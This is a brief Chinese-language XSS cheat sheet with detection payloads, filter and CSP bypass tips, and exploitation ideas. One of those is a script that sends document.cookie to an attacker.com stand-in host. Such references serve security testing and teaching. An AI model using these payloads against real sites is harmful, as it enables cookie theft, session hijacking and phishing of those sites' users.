# 跨站脚本攻击 (XSS)

## 描述
通过注入恶意脚本，在用户浏览器中执行，窃取Cookie、会话令牌或进行钓鱼。

## 触发条件
- 存在用户输入回显在HTML中的位置（如评论、搜索、URL参数）。
- 用户内容未正确过滤或转义。

## 检测方法
1. **简单注入**：输入 `<script>alert(1)</script>`，观察是否弹出弹窗。
2. **无弹窗时**：输入 `<img src=x onerror=alert(1)>` 或 `<svg onload=alert(1)>`。
3. **观察输出位置**：如果输出在HTML标签属性内（如 `value="X"`），需闭合属性。

## 利用方式
- **窃取Cookie**：`<script>fetch('http://attacker.com?c='+document.cookie)</script>`。
- **劫持会话**：将Cookie发送到攻击者服务器。
- **键盘记录**：注入监听键盘事件代码。
- **钓鱼**：伪造登录框诱导用户输入密码。

## 绕过技巧
- **过滤 `<script>`**：使用 `<img src=x onerror=alert(1)>` 或 `<svg onload=...>`。
- **过滤事件**：使用 `onmouseover`、`onfocus`、`onerror` 等。
- **使用 `javascript:` 协议**：`<a href="javascript:alert(1)">click</a>`。
- **编码绕过**：使用HTML实体、URL编码、Unicode编码。
- **利用 `eval`、`setTimeout`、`setInterval`** 绕过过滤。

## 附加提示
- 存储型XSS危害更大，需关注持久化存储点。
- 若CSP限制严格，尝试利用 `unsafe-inline` 或 CDN 白名单中的资源。